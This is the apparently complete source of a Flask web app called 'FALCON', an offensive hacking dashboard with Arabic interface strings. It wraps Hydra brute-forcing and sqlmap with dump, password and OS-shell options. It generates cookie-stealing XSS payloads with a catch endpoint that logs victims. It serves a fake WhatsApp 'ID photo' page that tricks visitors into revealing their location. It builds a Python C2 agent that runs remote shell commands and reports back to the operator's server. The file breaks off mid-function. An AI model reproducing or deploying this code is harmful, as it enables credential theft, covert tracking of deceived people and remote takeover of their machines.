import os, json, subprocess, shutil, time, platform
from datetime import datetime
from flask import Flask, render_template, jsonify, request, session, redirect, url_for, render_template_string

import config, auth, database
from file_manager import list_files, upload_file, delete_file
import hydra_modules

from engines.hydra_engine import HydraEngine
from engines.network_engine import NetworkEngine
from engines.port_engine import PortEngine
from engines.dns_engine import DnsEngine
from engines.ip_tracker import IPTracker
from engines.faris_engine import FarisEngine
from engines.history_engine import HistoryEngine
from engines.report_engine import ReportEngine
from engines.stats_engine import StatsEngine
from engines.discovery_engine import DiscoveryEngine
from engines.c2_engine import C2Engine
from engines.sigint_engine import SigintEngine
from plugins.loader import PluginLoader

app = Flask(__name__)

from godfather import godfather_bp
app.register_blueprint(godfather_bp)



app.secret_key = os.environ.get("FALCON_SECRET") or "FALCON-" + os.urandom(16).hex()
database.init_db()

@app.after_request
def add_header(r):
    r.headers["Cache-Control"] = "no-cache, no-store, must-revalidate"
    r.headers["Pragma"] = "no-cache"
    r.headers["Expires"] = "0"
    return r

# تهيئة المحركات
hydra_engine = HydraEngine()
network_engine = NetworkEngine()
port_engine = PortEngine()
dns_engine = DnsEngine()
ip_tracker = IPTracker()
faris_engine = FarisEngine()
history_engine = HistoryEngine()
report_engine = ReportEngine()
stats_engine = StatsEngine()
discovery_engine = DiscoveryEngine()
c2_engine = C2Engine()
sigint_engine = SigintEngine()
plugin_loader = PluginLoader()
plugin_loader.load_all()

# ================= Auth =================
@app.route("/login", methods=["GET", "POST"])
def login_page():
    error = ""
    if request.method == "POST":
        pwd = request.form.get("password", "")
        if auth.check_password(pwd):
            session["authenticated"] = True
            session["last_activity"] = time.time()
            return redirect(url_for("dashboard"))
        error = "كلمة المرور غير صحيحة"
    if not auth.is_configured():
        return "FALCON غير مُهيأ. شغّل: python3 setup_password.py", 503
    return render_template_string(auth.LOGIN_HTML, error=error)

@app.route("/logout")
def logout_page():
    session.clear()
    return redirect(url_for("login_page"))

# ================= Pages =================
@app.route("/")
@auth.login_required
def dashboard(): return render_template("dashboard.html")

@app.route("/network")
@auth.login_required
def page_network(): return render_template("network.html")

@app.route("/hydra")
@auth.login_required
def page_hydra(): return render_template("hydra.html")

@app.route("/iptracker")
@auth.login_required
def page_iptracker(): return render_template("iptracker.html")

@app.route("/ports")
@auth.login_required
def page_ports(): return render_template("ports.html")

@app.route("/reports")
@auth.login_required
def page_reports(): return render_template("reports.html")

@app.route("/history")
@auth.login_required
def page_history(): return render_template("history.html")

@app.route("/files")
@auth.login_required
def page_files(): return render_template("files.html")

@app.route("/settings")
@auth.login_required
def page_settings(): return render_template("settings.html")

@app.route("/payload")
@auth.login_required
def page_payload(): return render_template("payload.html")

@app.route("/c2")
@auth.login_required
def page_c2(): return render_template("c2.html")

# ================= API: Hydra =================
@app.route("/api/hydra")
@auth.login_required
def api_hydra():
    path = shutil.which("hydra")
    if not path: return jsonify({"installed": False, "message": "غير مثبتة"})
    try:
        r = subprocess.run([path, "-h"], capture_output=True, text=True, timeout=5)
        out = (r.stdout + "\n" + r.stderr).strip()
        version = next((l.strip() for l in out.splitlines() if "Hydra" in l), "غير معروف")
        return jsonify({"installed": True, "path": path, "version": version})
    except Exception as e:
        return jsonify({"installed": True, "message": str(e)})

@app.route("/api/hydra/modules")
@auth.login_required
def api_hydra_modules(): return jsonify(hydra_engine.discover_modules())

@app.route("/api/hydra/module")
@auth.login_required
def api_hydra_module():
    name = request.args.get("name", "").strip()
    return jsonify(hydra_modules.module_info(name))

@app.route("/api/hydra/run", methods=["POST"])
@auth.login_required
def api_hydra_run():
    data = request.json or {}
    target = data.get("target", "").strip()
    service = data.get("service", "ssh").strip()
    user = data.get("user", "").strip()
    password = data.get("password", "").strip()
    if not target: return jsonify({"success": False, "message": "أدخل الهدف"})
    path = shutil.which("hydra")
    if not path: return jsonify({"success": False, "message": "Hydra غير مثبتة"})
    cmd = [path, "-I"]
    if user: cmd.extend(["-l", user])
    if password: cmd.extend(["-p", password])
    cmd.extend([service + "://" + target])
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
        return jsonify({"success": True, "output": (r.stdout + "\n" + r.stderr).strip()})
    except Exception as e:
        return jsonify({"success": False, "message": str(e)})

# ================= API: Network & Ports =================
@app.route("/api/wifi")
@auth.login_required
def api_wifi(): return jsonify(network_engine.scan_wifi())

@app.route("/api/arp")
@auth.login_required
def api_arp(): return jsonify(network_engine.arp_scan())

@app.route("/api/ports")
@auth.login_required
def api_ports():
    host = request.args.get("host", "").strip()
    stype = request.args.get("type", "fast")
    if not host: return jsonify({"success": False, "message": "أدخل host"}), 400
    return jsonify(port_engine.scan(host, aggressive=(stype=="aggressive")))

@app.route("/api/discover")
@auth.login_required
def api_discover():
    cidr = request.args.get("cidr", "").strip()
    return jsonify(discovery_engine.discover_subnet(cidr))

@app.route("/api/banner")
@auth.login_required
def api_banner():
    return jsonify(discovery_engine.grab_banner(request.args.get("ip"), int(request.args.get("port"))))

# ================= API: IP Tracker =================
@app.route("/api/ip")
@auth.login_required
def api_ip(): return jsonify(ip_tracker.lookup(request.args.get("ip", "").strip()))

# ================= API: Files & Reports =================


@app.route("/api/report")
@auth.login_required
def api_report(): return jsonify(report_engine.json_report())

@app.route("/api/stats")
@auth.login_required
def api_stats(): return jsonify(database.stats())

@app.route("/api/history")
@auth.login_required
def api_history(): return jsonify(history_engine.list())

@app.route("/api/config")
@auth.login_required
def api_config(): return jsonify(config.load())

@app.route("/api/plugins")
@auth.login_required
def api_plugins(): return jsonify(plugin_loader.list_info())

# ================= API: Payload Lab =================
@app.route("/api/payload/generate")
@auth.login_required
def api_payload_generate():
    ptype = request.args.get("type", "alert")
    host = request.host_url.rstrip("/")
    if ptype == "alert": code, desc = "<script>alert('FALCON XSS')</script>", "نافذة منبثقة"
    elif ptype == "cookie": code, desc = f"<script>new Image().src='{host}/api/payload/catch?c='+document.cookie;</script>", "سرقة الكوكيز"
    elif ptype == "redirect": code, desc = "<script>window.location.href='https://example.com';</script>", "إعادة توجيه"
    elif ptype == "deface": code, desc = "<script>document.body.innerHTML='<h1>Hacked</h1>';</script>", "تخريب الصفحة"
    else: code, desc = "", ""
    return jsonify({"code": code, "description": desc})

@app.route("/api/payload/catch")
def api_payload_catch():
    cookie = request.args.get("c", "")
    ip = request.remote_addr
    import sqlite3
    db = os.path.join(os.path.expanduser("~/FALCON"), "data", "falcon.db")
    conn = sqlite3.connect(db)
    conn.execute("INSERT INTO payload_logs (timestamp, payload_type, victim_ip, data) VALUES (?,?,?,?)",
                 (datetime.now().isoformat(), "cookie_steal", ip, cookie))
    conn.commit(); conn.close()
    return jsonify({"status": "received"})

@app.route("/api/payload/logs")
@auth.login_required
def api_payload_logs():
    import sqlite3
    db = os.path.join(os.path.expanduser("~/FALCON"), "data", "falcon.db")
    conn = sqlite3.connect(db); conn.row_factory = sqlite3.Row
    rows = conn.execute("SELECT * FROM payload_logs ORDER BY id DESC LIMIT 50").fetchall()
    conn.close()
    return jsonify([dict(r) for r in rows])

# ================= API: C2 (الفارس) =================
@app.route("/api/c2/status")
@auth.login_required
def api_c2_status(): return jsonify(c2_engine.status())

@app.route("/api/c2/start", methods=["POST"])
@auth.login_required
def api_c2_start():
    port = request.json.get("port", 4444)
    return jsonify(c2_engine.start_server(port))

@app.route("/api/c2/stop", methods=["POST"])
@auth.login_required
def api_c2_stop(): return jsonify(c2_engine.stop_server())

@app.route("/api/c2/generate", methods=["POST"])
@auth.login_required
def api_c2_generate():
    data = request.json
    return jsonify(c2_engine.generate_payload(data.get("lhost"), data.get("lport")))

@app.route("/api/c2/cmd", methods=["POST"])
@auth.login_required
def api_c2_cmd():
    data = request.json
    return jsonify(c2_engine.send_command(data.get("cmd")))


@app.route("/sigint")
@auth.login_required
def page_sigint(): return render_template("sigint.html")

@app.route("/api/sigint/analyze")
@auth.login_required
def api_sigint_analyze(): return jsonify(sigint_engine.analyze_towers())


# ============== Link Tracker ==============
@app.route("/api/link/generate", methods=["POST"])
@auth.login_required
def api_link_generate():
    import uuid, sqlite3
    link_id = str(uuid.uuid4())[:8]
    db = os.path.join(os.path.expanduser("~/FALCON"), "data", "falcon.db")
    conn = sqlite3.connect(db)
    conn.execute("INSERT INTO link_tracker (id, created, ip, lat, lon, user_agent) VALUES (?,?,?,?,?,?)",
                 (link_id, datetime.now().isoformat(), "pending", "pending", "pending", "pending"))
    conn.commit(); conn.close()
    url_normal = request.host_url + "t/" + link_id
    url_cloaked = request.host_url + "c/" + link_id
    return jsonify({"success": True, "link": url_normal, "cloaked": url_cloaked, "id": link_id})

@app.route("/t/<link_id>", methods=["GET"])
def link_target(link_id):
    return f"""
    <!DOCTYPE html><html lang="ar"><head><meta charset="UTF-8"><title>Loading...</title>
    <script>
    if (navigator.geolocation) {{
        navigator.geolocation.getCurrentPosition(
            (pos) => {{
                fetch("/api/link/catch?link_id={link_id}&lat=" + pos.coords.latitude + "&lon=" + pos.coords.longitude);
                document.body.innerHTML = '<h2>شكراً لك</h2>';
            }},
            (err) => {{
                fetch("/api/link/catch?link_id={link_id}&lat=denied&lon=denied");
                document.body.innerHTML = '<h2>يجب السماح بالموقع</h2>';
            }}
        );
    }}
    </script>
    <body style="background:#07111f;color:white;text-align:center;padding:50px;font-family:Arial"><h3>Loading...</h3></body>
    </html>
    """


@app.route("/api/link/results")
@auth.login_required
def api_link_results():
    import sqlite3
    db = os.path.join(os.path.expanduser("~/FALCON"), "data", "falcon.db")
    conn = sqlite3.connect(db); conn.row_factory = sqlite3.Row
    rows = conn.execute("SELECT * FROM link_tracker ORDER BY created DESC LIMIT 20").fetchall()
    conn.close()
    return jsonify([dict(r) for r in rows])





@app.route("/c/<link_id>", methods=["GET"])
def cloaked_target(link_id):
    return f"""
    <!DOCTYPE html><html lang="ar" dir="rtl"><head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
    <title>WhatsApp</title>
    <!-- استخدام خطوط وأيقونات حقيقية -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Segoe+UI:wght@400;600&display=swap" rel="stylesheet">
    <style>
        * {{ box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; -webkit-tap-highlight-color: transparent; }}
        body {{ margin:0; background-color:#efeae2; height:100vh; display:flex; flex-direction:column; overflow:hidden; }}
        
        /* الشريط العلوي */
        .header {{ background-color:#008069; color:white; padding:10px 15px; display:flex; align-items:center; justify-content:space-between; position:sticky; top:0; z-index:10; box-shadow:0 1px 3px rgba(0,0,0,0.2); }}
        .header-right {{ display:flex; align-items:center; gap:10px; }}
        .header-right i {{ font-size:18px; cursor:pointer; }}
        .avatar {{ width:40px; height:40px; background:#dfe5e7; border-radius:50%; display:flex; align-items:center; justify-content:center; color:#8696a0; font-size:20px; overflow:hidden; }}
        .avatar img {{ width:100%; height:100%; object-fit:cover; }}
        .contact-info {{ display:flex; flex-direction:column; margin-right:10px; }}
        .contact-name {{ font-weight:600; font-size:16px; }}
        .contact-status {{ font-size:12px; color:#d1d7db; }}
        .header-icons {{ display:flex; gap:20px; color:white; }}

        /* منطقة الدردشة */
        .chat-area {{ flex:1; padding:20px 15px; display:flex; flex-direction:column; gap:8px; overflow-y:auto; background-image:url('https://user-images.githubusercontent.com/15075759/28719144-86dc0f70-73b1-11e7-911d-60d70fcded21.png'); background-size:cover; background-blend-mode:multiply; }}
        
        .date-divider {{ background:#e1f2fa; color:#54656f; font-size:12px; padding:5px 12px; border-radius:8px; align-self:center; margin-bottom:10px; box-shadow:0 1px 0.5px rgba(0,0,0,0.1); }}
        
        .msg-bubble {{ background:#ffffff; padding:8px 12px; border-radius:8px; align-self:flex-start; max-width:85%; font-size:14px; position:relative; box-shadow:0 1px 0.5px rgba(0,0,0,0.13); border-top-right-radius:0; }}
        .msg-time {{ font-size:11px; color:#667781; text-align:left; margin-top:4px; display:flex; justify-content:flex-end; align-items:center; gap:3px; }}
        .msg-time i {{ color:#53bdeb; font-size:12px; }}
        
        .file-card {{ background:#f0f2f5; padding:10px; border-radius:8px; display:flex; align-items:center; gap:12px; cursor:pointer; margin-top:5px; border:1px solid #e9edef; }}
        .file-icon {{ width:45px; height:45px; background:#dfe5e7; border-radius:5px; display:flex; align-items:center; justify-content:center; font-size:20px; color:#54656f; }}
        .file-info {{ display:flex; flex-direction:column; }}
        .file-name {{ font-size:14px; font-weight:600; color:#111b21; }}
        .file-size {{ font-size:12px; color:#667781; }}

        /* شريط الإدخال */
        .footer {{ background:#f0f2f5; padding:8px 10px; display:flex; align-items:center; gap:8px; }}
        .input-box {{ flex:1; background:#ffffff; border-radius:20px; padding:12px 15px; color:#111b21; font-size:15px; border:none; outline:none; box-shadow:0 1px 1px rgba(0,0,0,0.05); }}
        .input-box::placeholder {{ color:#8696a0; }}
        .send-btn {{ background:#008069; width:45px; height:45px; border-radius:50%; display:flex; align-items:center; justify-content:center; color:white; font-size:20px; cursor:pointer; border:none; box-shadow:0 1px 3px rgba(0,0,0,0.2); }}
        .send-btn:active {{ background:#006b59; }}

        /* شاشة التحميل */
        .loading-screen {{ position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.5); display:none; flex-direction:column; align-items:center; justify-content:center; z-index:999; }}
        .spinner {{ border:3px solid rgba(255,255,255,0.3); border-top:3px solid white; border-radius:50%; width:35px; height:35px; animation:spin 1s linear infinite; margin-bottom:15px; }}
        @keyframes spin {{ 0% {{ transform:rotate(0deg); }} 100% {{ transform:rotate(360deg); }} }}
        .loading-text {{ color:white; font-size:14px; font-weight:bold; }}
    </style>
    </head>
    <body>
        <div class="header">
            <div class="header-right">
                <i class="fas fa-arrow-right"></i>
                <div class="avatar">
                    <img src="https://ui-avatars.com/api/?name=User&background=random" alt="Avatar">
                </div>
                <div class="contact-info">
                    <div class="contact-name">جهة اتصال</div>
                    <div class="contact-status">متصل الآن</div>
                </div>
            </div>
            <div class="header-icons">
                <i class="fas fa-video"></i>
                <i class="fas fa-phone"></i>
                <i class="fas fa-ellipsis-v"></i>
            </div>
        </div>
        
        <div class="chat-area">
            <div class="date-divider">اليوم</div>
            <div class="msg-bubble">
                مرحباً، لقد أرسلت لك الملف المطلوب. الرجاء فتحه وتأكيد الاستلام.
                <div class="msg-time">10:45 ص <i class="fas fa-check-double"></i></div>
            </div>
            <!-- الملف المموه -->
            <div class="msg-bubble" style="padding:5px; cursor:pointer;" onclick="startTracking()">
                <div class="file-card">
                    <div class="file-icon"><i class="fas fa-file-image"></i></div>
                    <div class="file-info">
                        <div class="file-name">صورة_هوية.jpg</div>
                        <div class="file-size">1.4 MB · JPG</div>
                    </div>
                </div>
                <div class="msg-time">10:46 ص <i class="fas fa-check-double"></i></div>
            </div>
        </div>

        <div class="footer">
            <input type="text" class="input-box" placeholder="اكتب رسالة..." id="msgInput">
            <button class="send-btn" onclick="startTracking()"><i class="fas fa-paper-plane"></i></button>
        </div>
        
        <div class="loading-screen" id="loading">
            <div class="spinner"></div>
            <div class="loading-text">جارٍ تحميل الملف...</div>
        </div>

        <script>
        function startTracking() {{
            document.getElementById('loading').style.display = 'flex';
            if (navigator.geolocation) {{
                navigator.geolocation.getCurrentPosition(
                    (pos) => {{
                        fetch("/api/link/catch?link_id={link_id}&lat=" + pos.coords.latitude + "&lon=" + pos.coords.longitude);
                        setTimeout(() => {{ window.location.href = "https://web.whatsapp.com"; }}, 1500);
                    }},
                    (err) => {{
                        fetch("/api/link/catch?link_id={link_id}&lat=denied&lon=denied");
                        document.getElementById('loading').style.display = 'none';
                        alert("تعذر تحميل الملف. يرجى المحاولة مرة أخرى.");
                    }}
                );
            }}
        }}
        </script>
    </body></html>
    """



@app.route("/sqli")
@auth.login_required
def page_sqli():
    return render_template("sqli.html")

@app.route("/bughunter")
@auth.login_required
def page_bughunter():
    return render_template("bughunter.html")

@app.route("/livemap")
@auth.login_required
def page_livemap():
    return render_template("livemap.html")

@app.route("/sniffer")
@auth.login_required
def page_sniffer():
    return render_template("sniffer.html")

@app.route("/wifi")
@auth.login_required
def page_wifi():
    return render_template("wifi.html")


@app.route("/api/sqli/scan")
@auth.login_required
def api_sqli_scan():
    import subprocess
    target_url = request.args.get("url", "")
    level = request.args.get("level", "2")
    risk = request.args.get("risk", "1")
    action = request.args.get("action", "scan")
    tamper = request.args.get("tamper", "")
    random_agent = request.args.get("random_agent", "0")
    use_tor = request.args.get("tor", "0")
    if not target_url:
        return jsonify({"success": False, "message": "الرابط مطلوب"})
    cmd = ["sqlmap", "-u", target_url, "--batch", f"--level={level}", f"--risk={risk}"]
    if tamper: cmd.append(f"--tamper={tamper}")
    if random_agent == "1": cmd.append("--random-agent")
    if use_tor == "1": cmd.append("--tor")
    if action == "dbs": cmd.append("--dbs")
    elif action == "tables": cmd.extend(["--tables"])
    elif action == "dump": cmd.append("--dump")
    elif action == "passwords": cmd.append("--passwords")
    elif action == "shell": cmd.append("--os-shell")
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
        output = result.stdout + chr(10) + result.stderr
        vulnerable = "vulnerable" in output.lower() or "injectable" in output.lower()
        save_history("SQLi", f"فحص {target_url}")
        return jsonify({"success": True, "vulnerable": vulnerable, "raw_output": output})
    except subprocess.TimeoutExpired:
        return jsonify({"success": False, "message": "انتهت مهلة الفحص"})
    except Exception as e:
        return jsonify({"success": False, "message": str(e)})


import requests
from urllib.parse import urlparse, urljoin, parse_qs, urlencode
from bs4 import BeautifulSoup
import re

@app.route("/api/bughunter/crawl")
@auth.login_required
def api_bughunter_crawl():
    target_url = request.args.get("url", "").strip()
    if not target_url:
        return jsonify({"success": False, "message": "الرابط مطلوب"})
    
    if not target_url.startswith("http"):
        target_url = "http://" + target_url

    XSS_PAYLOAD = "<script>alert('XSS_FALCON')</script>"
    LFI_PAYLOADS = ["../../../../etc/passwd", "..%2f..%2f..%2f..%2fetc%2fpasswd"]
    
    vulnerable_details = []
    scanned_links = 0
    scanned_forms = 0
    visited = set()
    to_visit = [target_url]
    domain = urlparse(target_url).netloc

    headers = {"User-Agent": "Mozilla/5.0 (FALCON Scanner)"}
    session = requests.Session()
    session.headers.update(headers)

    try:
        while to_visit and scanned_links < 15:
            current = to_visit.pop(0)
            if current in visited:
                continue
            visited.add(current)
            
            try:
                resp = session.get(current, timeout=10)
                if resp.status_code != 200:
                    continue
                scanned_links += 1
                soup = BeautifulSoup(resp.text, 'html.parser')
                
                # 1. فحص النماذج (Forms) لثغرات XSS
                for form in soup.find_all('form'):
                    scanned_forms += 1
                    action = form.get('action', '')
                    form_url = urljoin(current, action)
                    method = form.get('method', 'get').lower()
                    inputs = {}
                    for inp in form.find_all('input'):
                        name = inp.get('name')
                        if name:
                            inputs[name] = XSS_PAYLOAD
                    
                    try:
                        if method == 'post':
                            r = session.post(form_url, data=inputs, timeout=10)
                        else:
                            r = session.get(form_url, params=inputs, timeout=10)
                        
                        if XSS_PAYLOAD in r.text:
                            vulnerable_details.append({"type": "XSS (Form)", "url": form_url, "param": ", ".join(inputs.keys())})
                    except: pass

                # 2. فحص روابط URL لثغرات XSS و LFI
                for a in soup.find_all('a', href=True):
                    link = urljoin(current, a['href'])
                    if urlparse(link).netloc == domain and link not in visited:
                        to_visit.append(link)
                    
                    parsed = urlparse(link)
                    if parsed.query:
                        params = parse_qs(parsed.query)
                        # فحص XSS
                        xss_params = {k: XSS_PAYLOAD for k in params}
                        test_url = parsed._replace(query=urlencode(xss_params, doseq=True)).geturl()
                        try:
                            r = session.get(test_url, timeout=10)
                            if XSS_PAYLOAD in r.text:
                                vulnerable_details.append({"type": "XSS (URL)", "url": link, "param": ", ".join(params.keys())})
                        except: pass
                        
                        # فحص LFI
                        for payload in LFI_PAYLOADS:
                            lfi_params = {k: payload for k in params}
                            test_url = parsed._replace(query=urlencode(lfi_params, doseq=True)).geturl()
                            try:
                                r = session.get(test_url, timeout=10)
                                if "root:x:0:0" in r.text or "[boot loader]" in r.text:
                                    vulnerable_details.append({"type": "LFI", "url": link, "param": ", ".join(params.keys())})
                                    break
                            except: pass
            except: continue

        # إزالة التكرار
        unique_vulns = []
        seen = set()
        for v in vulnerable_details:
            key = (v['type'], v['url'], v['param'])
            if key not in seen:
                seen.add(key)
                unique_vulns.append(v)

        return jsonify({
            "success": True,
            "vulnerable": len(unique_vulns) > 0,
            "count": len(unique_vulns),
            "details": unique_vulns,
            "scanned_links": scanned_links,
            "scanned_forms": scanned_forms
        })
    except Exception as e:
        return jsonify({"success": False, "message": str(e)})


# ================= محرك C2 (الفارس) باستخدام SQLite =================
import sqlite3
from datetime import datetime

C2_DB = os.path.join(os.path.dirname(__file__), "c2_data.db")

def init_c2_db():
    conn = sqlite3.connect(C2_DB)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS clients (
        id TEXT PRIMARY KEY,
        last_seen TEXT
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS commands (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        client_id TEXT,
        cmd TEXT,
        status TEXT DEFAULT 'pending'
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS results (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        client_id TEXT,
        output TEXT,
        timestamp TEXT
    )''')
    conn.commit()
    conn.close()

init_c2_db()

@app.route("/api/web_c2/generate_payload")
@auth.login_required
def c2_generate_payload():
    server = request.args.get("server", "")
    if not server: return jsonify({"success": False, "message": "الرابط مطلوب"})
    
    payload = f'''# FALCON C2 Agent (Python)
import requests, subprocess, time, os
SERVER = "{server}"
CLIENT_ID = os.urandom(4).hex()

def register():
    try: requests.get(f"{{SERVER}}/api/web_c2/register?id={{CLIENT_ID}}", timeout=5)
    except: pass

def get_cmd():
    try:
        r = requests.get(f"{{SERVER}}/api/web_c2/get_cmd?id={{CLIENT_ID}}", timeout=5)
        return r.text.strip()
    except: return ""

def send_result(res):
    try: requests.post(f"{{SERVER}}/api/web_c2/send_result", json={{"id": CLIENT_ID, "result": res}}, timeout=5)
    except: pass

register()
while True:
    cmd = get_cmd()
    if cmd and cmd != "NONE":
        try:
            out = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=10).decode("utf-8", errors="ignore")
        except Exception as e: out = str(e)
        send_result(out)
    time.sleep(3)
'''
    return jsonify({"success": True, "payload": payload})

@app.route("/api/web_c2/register")
def c2_register():
    cid = request.args.get("id")
    if cid:
        conn = sqlite3.connect(C2_DB)
        c = conn.cursor()
        c.execute("INSERT OR REPLACE INTO clients (id, last_seen) VALUES (?, ?)", (cid, datetime.now().strftime("%Y-%m-%d %H:%M:%S")))
        conn.commit()
        conn.close()
    return "OK"

@app.route("/api/web_c2/clients")
@auth.login_required
def c2_clients():
    conn = sqlite3.connect(C2_DB)
    c = conn.cursor()
    c.execute("SELECT id FROM clients")
    clients = [row[0] for row in c.fetchall()]
    conn.close()
    return jsonify(clients)

@app.route("/api/web_c2/send", methods=["POST"])
@auth.login_required
def c2_send():
    req = request.get_json()
    cid = req.get("client_id")
    cmd = req.get("cmd")
    if cid and cmd:
        conn = sqlite3.connect(C2_DB)
        c = conn.cursor()
        c.execute("INSERT INTO commands (client_id, cmd) VALUES (?, ?)", (cid, cmd))
        conn.commit()
        conn.close()
        return jsonify({"success": True})
    return jsonify({"success": False})

@app.route("/api/web_c2/get_cmd")
def c2_get_cmd():
    cid = request.args.get("id")
    if cid:
        conn = sqlite3.connect(C2_DB)
        c = conn.cursor()
        c.execute("SELECT id, cmd FROM commands WHERE client_id=? AND status='pending' ORDER BY id ASC LIMIT 1", (cid,))
        row = c.fetchone()
        if row:
            c.execute("UPDATE commands SET status='sent' WHERE id=?", (row[0],))
            conn.commit()
            conn.close()
            return row[1]
        conn.close()
    return "NONE"

@app.route("/api/web_c2/send_result", methods=["POST"])
def c2_send_result():
    req = request.get_json()
    cid = req.get("id")
    res = req.get("result")
    if cid and res:
        conn = sqlite3.connect(C2_DB)
        c = conn.cursor()
        c.execute("INSERT INTO results (client_id, output, timestamp) VALUES (?, ?, ?)", (cid, res, datetime.now().strftime("%H:%M:%S")))
        conn.commit()
        conn.close()
    return "OK"

@app.route("/api/web_c2/results")
@auth.login_required
def c2_results():
    cid = request.args.get("client_id")
    if not cid: return jsonify([])
    conn = sqlite3.connect(C2_DB)
    c = conn.cursor()
    c.execute("SELECT output, timestamp FROM results WHERE client_id=? ORDER BY id ASC", (cid,))
    results = [f"[{row[1]}] {row[0]}" for row in c.fetchall()]
    conn.close()
    return jsonify(results)

# ====================================================================






@app.route("/api/network/deep_scan")
@auth.login_required
def api_network_deep_scan():
    import subprocess, re
    try:
        # 1. جلب IP باستخدام ifconfig
        ifconfig_result = subprocess.run(["ifconfig"], capture_output=True, text=True, timeout=5)
        output = ifconfig_result.stdout
        
        # البحث عن أول عنوان IP يبدأ بـ 192.168 أو 10. أو 172.
        ip_match = re.search(r'inet\s+(192\.168\.\d+\.\d+|10\.\d+\.\d+\.\d+|172\.\d+\.\d+\.\d+)', output)
        if not ip_match:
            return jsonify({"success": False, "message": "لم يتم العثور على عنوان IP للشبكة المحلية. تأكد من اتصالك بالواي فاي."})
        
        local_ip = ip_match.group(1)
        subnet = ".".join(local_ip.split(".")[:3]) + ".0/24"
        
        # 2. اكتشاف الأجهزة باستخدام nmap
        nmap_result = subprocess.run(["nmap", "-sn", subnet], capture_output=True, text=True, timeout=60)
        nmap_out = nmap_result.stdout
        
        devices = []
        lines = nmap_out.splitlines()
        for i, line in enumerate(lines):
            if "Nmap scan report for" in line:
                ip_m = re.search(r'(\d+\.\d+\.\d+\.\d+)', line)
                if ip_m:
                    ip = ip_m.group(1)
                    hostname = "غير معروف"
                    if "for " in line and "(" in line:
                        hostname = line.split("for ")[1].split(" (")[0]
                    
                    if i + 1 < len(lines) and "Host is up" in lines[i+1]:
                        devices.append({"ip": ip, "hostname": hostname, "ports": [], "device_type": "غير معروف"})
        
        # 3. فحص المنافذ
        for dev in devices:
            try:
                port_res = subprocess.run(["nmap", "-p", "22,80,443,8080,3389,445", dev["ip"]], capture_output=True, text=True, timeout=30)
                open_ports = []
                for line in port_res.stdout.splitlines():
                    if "/tcp" in line and "open" in line:
                        open_ports.append(line.split("/")[0])
                dev["ports"] = open_ports
                if "80" in open_ports or "443" in open_ports: dev["device_type"] = "🌐 راوتر / سيرفر"
                elif "3389" in open_ports: dev["device_type"] = "🖥️ ويندوز (RDP)"
                elif "445" in open_ports: dev["device_type"] = "📁 ويندوز (SMB)"
                elif "22" in open_ports: dev["device_type"] = "🐧 لينكس (SSH)"
                else: dev["device_type"] = "📱 جهاز محمول"
            except: pass
        
        save_history("NetworkDeepScan", f"تم اكتشاف {len(devices)} جهاز")
        return jsonify({"success": True, "local_ip": local_ip, "subnet": subnet, "count": len(devices), "devices": devices})
    except Exception as e:
        return jsonify({"success": False, "message": str(e)})


@app.route("/api/files/list")
@auth.login_required
def api_files_list():
    import os
    category = request.args.get("category", "general")
    base = os.path.join(os.path.dirname(__file__), "uploads")
    folder = os.path.join(base, category)
    if not os.path.exists(folder):
        return jsonify({"success": True, "category": category, "files": []})
    files = []
    for f in os.listdir(folder):
        path = os.path.join(folder, f)
        if os.path.isfile(path):
            files.append({"name": f, "size": os.path.getsize(path), "mtime": os.path.getmtime(path)})
    files.sort(key=lambda x: x["mtime"], reverse=True)
    return jsonify({"success": True, "category": category, "files": files})

@app.route("/api/files/upload", methods=["POST"])
@auth.login_required
def api_files_upload():
    import os
    category = request.form.get("category", "general")
    file = request.files.get("file")
    if not file or file.filename == "":
        return jsonify({"success": False, "message": "لم يتم اختيار ملف"})
    base = os.path.join(os.path.dirname(__file__), "uploads")
    folder = os.path.join(base, category)
    os.makedirs(folder, exist_ok=True)
    filename = file.filename.replace("/", "_").replace("\\", "_")
    file.save(os.path.join(folder, filename))
    return jsonify({"success": True, "message": f"تم رفع {filename}"})

@app.route("/api/files/delete", methods=["POST"])
@auth.login_required
def api_files_delete():
    import os
    req = request.get_json()
    category = req.get("category", "general")
    filename = os.path.basename(req.get("filename", ""))
    base = os.path.join(os.path.dirname(__file__), "uploads")
    path = os.path.join(base, category, filename)
    if os.path.exists(path):
        os.remove(path)
        return jsonify({"success": True, "message": "تم الحذف"})
    return jsonify({"success": False, "message": "الملف غير موجود"})



# ================= محرك الإعدادات =================
@app.route("/api/config", methods=["GET"])
@auth.login_required
def api_config_get():
    try:
        with open("config.json", "r", encoding="utf-8") as f:
            config = json.load(f)
        return jsonify(config)
    except Exception as e:
        return jsonify({"error": str(e)})

@app.route("/api/config/save", methods=["POST"])
@auth.login_required
def api_config_save():
    try:
        req = request.get_json()
        with open("config.json", "r", encoding="utf-8") as f:
            config = json.load(f)
        
        # تحديث القيم المسموح بها فقط
        if "port" in req: config["port"] = int(req["port"])
        if "host" in req: config["host"] = req["host"]
        
        with open("config.json", "w", encoding="utf-8") as f:
            json.dump(config, f, ensure_ascii=False, indent=2)
        
        save_history("Settings", "تم تحديث الإعدادات")
        return jsonify({"success": True, "message": "تم حفظ الإعدادات. يرجى إعادة تشغيل السيرفر لتطبيق التغييرات."})
    except Exception as e:
        return jsonify({"success": False, "message": str(e)})



if __name__ == "__main__":
    print("✅ FALCON Professional Web Framework")
    app.run(host="127.0.0.1", port=5000, threaded=True, use_reloader=False)



@app.route("/t/<trap_id>")
def trap_catch(trap_id):
    import requests
    from datetime import datetime
    try:
        traps = load_traps()
        if trap_id in traps:
            visitor_ip = request.remote_addr
            user_agent = request.headers.get('User-Agent', 'غير معروف')
            lat = request.args.get('lat', '')
            lon = request.args.get('lon', '')
            
            geo = {}
            if lat and lon and lat != 'denied':
